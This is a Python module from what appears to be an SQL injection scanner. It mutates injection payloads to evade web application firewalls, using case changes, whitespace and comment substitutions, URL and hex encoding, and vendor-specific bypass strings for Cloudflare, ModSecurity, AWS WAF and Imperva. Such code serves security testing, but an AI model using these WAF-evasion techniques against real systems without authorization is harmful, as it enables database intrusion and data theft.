"""
SQL Injection Scanner - Payload Mutator.

Provides intelligent payload mutation for WAF bypass and coverage.
Integrates with WAFBypassEngine for sophisticated behavioural bypass.

Extracted from sqli_scanner.py as part of Phase 7 refactoring (2026-02-26).
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING, Any
from urllib.parse import quote

from utils.logger import get_logger

if TYPE_CHECKING:
    from scanning.modules.sqli.sqli_base import WAFType

logger = get_logger(__name__)

# WAF Bypass Engine integration (2026-02-20)
_WAF_BYPASS_ENGINE_AVAILABLE = True
try:
    from phantom.waf_bypass_engine import (
        WAFDetectionResult, get_waf_bypass_engine_sync,
    )
except ImportError:
    _WAF_BYPASS_ENGINE_AVAILABLE = False
    WAFDetectionResult = None  # type: ignore


class PayloadMutator:
    """Intelligent payload mutation for WAF bypass and coverage.

    2026-02-20: Enhanced with WAFBypassEngine integration.
    When a WAFDetectionResult is provided, uses sophisticated behavioural bypass
    strategies from phantom/waf_bypass_engine.py for better evasion.
    """

    @classmethod
    def mutate(
        cls,
        payload: str,
        waf_type: "WAFType | None" = None,
        waf_detection: Any = None,  # WAFDetectionResult
    ) -> list[str]:
        """Generate mutations of a payload.

        Args:
            payload: Original SQL injection payload
            waf_type: Detected WAF type (legacy API)
            waf_detection: Full WAFDetectionResult from WAFBypassEngine (preferred)

        Returns:
            List of mutated payloads for WAF bypass
        """
        mutations = [payload]  # Original

        # 2026-02-20: Use WAFBypassEngine if available and waf_detection provided
        if _WAF_BYPASS_ENGINE_AVAILABLE and waf_detection is not None and waf_detection.detected:
            try:
                bypass_mutations = cls._apply_waf_bypass_engine(payload, waf_detection)
                if bypass_mutations:
                    mutations.extend(bypass_mutations)
                    logger.debug(
                        f"[SQLi] WAFBypassEngine generated {len(bypass_mutations)} bypass variants "
                        f"for {waf_detection.waf_name} ({waf_detection.behaviour_family.value})"
                    )
                    # Return early with sophisticated bypasses - no need for basic mutations
                    return list(set(mutations))[:25]
            except Exception as e:
                logger.debug(f"[SQLi] WAFBypassEngine mutation failed, falling back: {e}")

        # Basic mutations (fallback or when no WAF detected)
        mutations.extend(cls._case_mutations(payload))
        mutations.extend(cls._whitespace_mutations(payload))
        mutations.extend(cls._comment_mutations(payload))
        mutations.extend(cls._encoding_mutations(payload))

        # WAF-specific mutations (legacy approach)
        if waf_type is not None:
            from scanning.modules.sqli.sqli_base import WAFType
            if waf_type != WAFType.NONE:
                mutations.extend(cls._waf_specific_mutations(payload, waf_type))

        return list(set(mutations))[:20]  # Limit to 20 unique mutations

    @classmethod
    def _apply_waf_bypass_engine(
        cls,
        payload: str,
        waf_detection: Any,  # WAFDetectionResult
    ) -> list[str]:
        """Apply WAFBypassEngine bypass strategies to payload.

        Uses behavioural classification for intelligent bypass selection:
        - REGEX_NAIVE: Simple encoding bypasses
        - REGEX_ADVANCED: Obfuscation + fragmentation
        - MACHINE_LEARNING: Semantic-valid payloads
        - SIGNATURE_BASED: Mutation techniques
        - HYBRID: Combined approach
        """
        if not _WAF_BYPASS_ENGINE_AVAILABLE:
            return []

        try:
            engine = get_waf_bypass_engine_sync()

            # Generate bypass variants using the engine
            # Context "sql" enables SQL-specific transformations
            variants = engine.generate_bypass_variants(
                payload=payload,
                detection=waf_detection,
                context="sql",
                max_variants=10,
            )

            # Extract just the payloads (not the technique info)
            bypassed_payloads = [v[0] for v in variants if v[0] != payload]

            return bypassed_payloads

        except Exception as e:
            logger.debug(f"[SQLi] WAFBypassEngine error: {e}")
            return []

    @classmethod
    def _case_mutations(cls, payload: str) -> list[str]:
        """Case variation mutations."""
        mutations = []
        keywords = ['SELECT', 'UNION', 'AND', 'OR', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'SLEEP', 'WAITFOR']

        result = payload
        for kw in keywords:
            if kw.lower() in payload.lower():
                # Random case
                random_case = ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(kw))
                result = re.sub(kw, random_case, result, flags=re.IGNORECASE)
        mutations.append(result)

        # All caps
        mutations.append(payload.upper())

        return mutations

    @classmethod
    def _whitespace_mutations(cls, payload: str) -> list[str]:
        """Whitespace alternative mutations."""
        mutations = []

        # Tab instead of space
        mutations.append(payload.replace(' ', '\t'))

        # Newline
        mutations.append(payload.replace(' ', '\n'))

        # Multiple spaces
        mutations.append(payload.replace(' ', '  '))

        # URL-encoded space
        mutations.append(payload.replace(' ', '%20'))

        # Plus sign
        mutations.append(payload.replace(' ', '+'))

        # Comment as space
        mutations.append(payload.replace(' ', '/**/'))

        return mutations

    @classmethod
    def _comment_mutations(cls, payload: str) -> list[str]:
        """SQL comment mutations."""
        mutations = []

        keywords = ['SELECT', 'UNION', 'AND', 'OR', 'FROM', 'WHERE']
        for kw in keywords:
            if kw.lower() in payload.lower():
                # Inline comment in keyword
                mid = len(kw) // 2
                commented = kw[:mid] + '/**/' + kw[mid:]
                mutations.append(re.sub(kw, commented, payload, flags=re.IGNORECASE))

        # MySQL version comment
        mutations.append(payload.replace('SELECT', '/*!50000SELECT*/'))
        mutations.append(payload.replace('UNION', '/*!UNION*/'))

        return mutations

    @classmethod
    def _encoding_mutations(cls, payload: str) -> list[str]:
        """Encoding mutations."""
        mutations = []

        # URL encoding
        mutations.append(quote(payload))

        # Double URL encoding
        mutations.append(quote(quote(payload)))

        # Hex encoding for strings
        if "'" in payload:
            # Convert string literals to hex
            hex_payload = payload
            strings = re.findall(r"'([^']*)'", payload)
            for s in strings:
                hex_str = '0x' + s.encode().hex()
                hex_payload = hex_payload.replace(f"'{s}'", hex_str)
            mutations.append(hex_payload)

        # Unicode
        mutations.append(payload.replace("'", "\\u0027"))

        return mutations

    @classmethod
    def _waf_specific_mutations(cls, payload: str, waf_type: "WAFType") -> list[str]:
        """WAF-specific bypass mutations."""
        from scanning.modules.sqli.sqli_base import WAFType

        mutations = []

        if waf_type == WAFType.CLOUDFLARE:
            mutations.append(payload.replace(' ', '/*!**/'))
            mutations.append(payload.replace('UNION', 'UNI%0bON'))
            mutations.append(payload.replace('SELECT', 'SE%0bLECT'))

        elif waf_type == WAFType.MODSECURITY:
            mutations.append(payload.replace(' AND ', ' /*!50000AND*/ '))
            mutations.append(payload.replace('=', ' LIKE '))
            mutations.append(payload + '-- -')

        elif waf_type == WAFType.AWS_WAF:
            mutations.append(payload.replace('OR', '||'))
            mutations.append(payload.replace('AND', '&&'))
            mutations.append(payload.replace(' ', chr(0x0b)))

        elif waf_type == WAFType.IMPERVA:
            mutations.append(payload.replace(' ', '/**/'))
            mutations.append(payload.replace('UNION', 'UN%00ION'))

        return mutations


__all__ = ["PayloadMutator"]
